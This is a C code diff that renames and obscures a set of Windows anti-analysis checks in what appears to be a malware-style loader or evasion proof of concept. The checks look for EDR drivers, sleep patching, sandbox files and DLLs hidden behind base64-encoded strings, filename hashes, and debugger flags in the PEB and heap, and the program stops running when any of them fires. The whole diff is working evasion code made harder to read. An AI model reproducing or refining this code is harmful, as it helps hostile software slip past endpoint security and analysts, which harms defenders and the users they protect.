@@ -24,7 +24,7 @@ void LaunchCalc() {
 }
 
 // EDR Detection: Scan system driver directory for known EDR drivers
-bool DetectEDRs() {
+bool DetS() {
     const char* edrDrivers[] = {
         "atrsdfw.sys", "avgtpx86.sys", "avgtpx64.sys", "naswSP.sys", "edrsensor.sys",
         "CarbonBlackK.sys", "parity.sys", "cbk7.sys", "cbstream", "csacentr.sys",
@@ -53,7 +53,7 @@ bool DetectEDRs() {
 }
 
 // Sleep Patching Detection: Checks if Sleep(10000) completes normally
-bool DetectSleepPatching() {
+bool DetSl() {
     LARGE_INTEGER startTime, endTime, frequency;
     QueryPerformanceFrequency(&frequency);
     QueryPerformanceCounter(&startTime);
@@ -71,8 +71,8 @@ bool DetectSleepPatching() {
     return false;
 }
 
-// Sandbox Detection using Base64 Encoding
-bool DetectSandboxFiles() {
+// Sandbox Detection files using Base64 Encoding
+bool DetSBF() {
     // Resolve API Function Dynamically
     if (!pPathFileExistsA) {
         pPathFileExistsA = (BOOL(WINAPI*)(LPCSTR))ResolveFn("hShlwapi.dll", "PathFileExistsA");
@@ -101,7 +101,7 @@ bool DetectSandboxFiles() {
     int numPaths = sizeof(encodedPaths) / sizeof(encodedPaths[0]);
 
     for (int i = 0; i < numPaths; i++) {
-        char* decodedPath = base64Decode(encodedPaths[i]); // Decode Path
+        char* decodedPath = Bsfd(encodedPaths[i]); // Decode Path
         if (!decodedPath) continue;
 
         if (pPathFileExistsA(decodedPath)) {
@@ -117,7 +117,7 @@ bool DetectSandboxFiles() {
 }
 
 // Filename Hash Detection: Checks if file name matches hash (common in sandboxes)
-bool DetectFilenameHash() {
+bool DetF() {
     char exePath[MAX_PATH];
     GetModuleFileNameA(NULL, exePath, MAX_PATH);
 
@@ -161,7 +161,7 @@ bool DetectFilenameHash() {
 }
 
 //Detect SandBox DLLs
-bool DetectDLLs() {
+bool DetSBD() {
     // Base64 Encoded DLLs (obfuscated)
     const char* encoded_realDLLs[] = {
         "a2VybmVsMzIuZGxs",  // kernel32.dll
@@ -183,7 +183,7 @@ bool DetectDLLs() {
     };
 
     for (int i = 0; i < sizeof(encoded_realDLLs) / sizeof(encoded_realDLLs[0]); i++) {
-        char* decodedPath = base64Decode(encoded_realDLLs[i]);
+        char* decodedPath = Bsfd(encoded_realDLLs[i]);
         HMODULE lib_inst = LoadLibraryA(decodedPath);
         if (lib_inst == NULL) {
             LaunchCalc();
@@ -196,7 +196,7 @@ bool DetectDLLs() {
     }
 
     for (int i = 0; i < sizeof(encoded_sandboxDLLs) / sizeof(encoded_sandboxDLLs[0]); i++) {
-        char* decodedPath = base64Decode(encoded_sandboxDLLs[i]);
+        char* decodedPath = Bsfd(encoded_sandboxDLLs[i]);
         HMODULE lib_inst = GetModuleHandleA(decodedPath);
         if (lib_inst != NULL) {
             LaunchCalc();
@@ -210,7 +210,8 @@ bool DetectDLLs() {
     return false;
 }
 
-bool IsDebuggerPresentPEB() {
+// Detect if NtGlobalFlag is present in PEB
+bool DetFPEB() {
     // Get Process Environment Block (PEB)
     #ifdef _WIN64
         PEB* peb = (PEB*)__readgsqword(0x60);
@@ -226,7 +227,8 @@ bool IsDebuggerPresentPEB() {
     return NtGlobalFlag & (FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS);
 }
 
-bool IsDebuggerPresentHeap() {
+//Detect debugger flags in HEAP
+bool DetFH() {
     // Get Process Environment Block (PEB)
     #ifdef _WIN64
         PEB* peb = (PEB*)__readgsqword(0x60);
@@ -253,25 +255,25 @@ bool PerfomChecksEnv() {
     bool detected = false;
 
     printf("[*] Checking for EDRs...\n");
-    detected |= DetectEDRs();
+    detected |= DetS();
 
     printf("[*] Checking for sleep patching...\n");
-    detected |= DetectSleepPatching();
+    detected |= DetSl();
 
     printf("[*] Checking for sandbox files...\n");
-    detected |= DetectSandboxFiles();
+    detected |= DetSBF();
 
     printf("[*] Checking for filename hash matching...\n");
-    detected |= DetectFilenameHash();
+    detected |= DetF();
 
     printf("[*] Checking for dll...\n");
-    detected |= DetectDLLs();
+    detected |= DetSBD();
 
     printf("[*] Checking for NtGlobalFlag...\n");
-    detected |= IsDebuggerPresentPEB();
+    detected |= DetFPEB();
 
     printf("[*] Checking for Heap Flags...\n");
-    detected |= IsDebuggerPresentHeap();
+    detected |= DetFH();
 
     if (detected) {
         printf("[!] Env unsafe, terminating execution.\n");
